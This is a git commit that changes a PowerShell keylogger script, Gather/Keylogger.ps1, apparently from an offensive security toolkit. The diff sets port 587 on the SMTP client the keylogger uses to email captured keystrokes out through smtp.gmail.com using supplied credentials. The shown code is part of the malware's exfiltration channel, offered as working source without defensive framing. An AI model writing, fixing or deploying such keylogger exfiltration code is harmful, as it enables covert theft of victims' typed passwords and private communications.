ec5da0fad268e307174fe3915b11d8eb1b3ec3d2
Gerard Delas Armas <gengstah@users.noreply.github.com>
2018-04-10 21:19:50 +0800

    Added port to SMTP Server

--- Gather/Keylogger.ps1
+++ Gather/Keylogger.ps1
@@ -301,7 +301,7 @@ function script:Keylogger
                 #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
                 $smtpserver = "smtp.gmail.com"
                 $msg = new-object Net.Mail.MailMessage
-                $smtp = new-object Net.Mail.SmtpClient($smtpServer )
+                $smtp = new-object Net.Mail.SmtpClient($smtpServer, 587)
                 $smtp.EnableSsl = $True
                 $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
                 $msg.From = "$username@gmail.com"
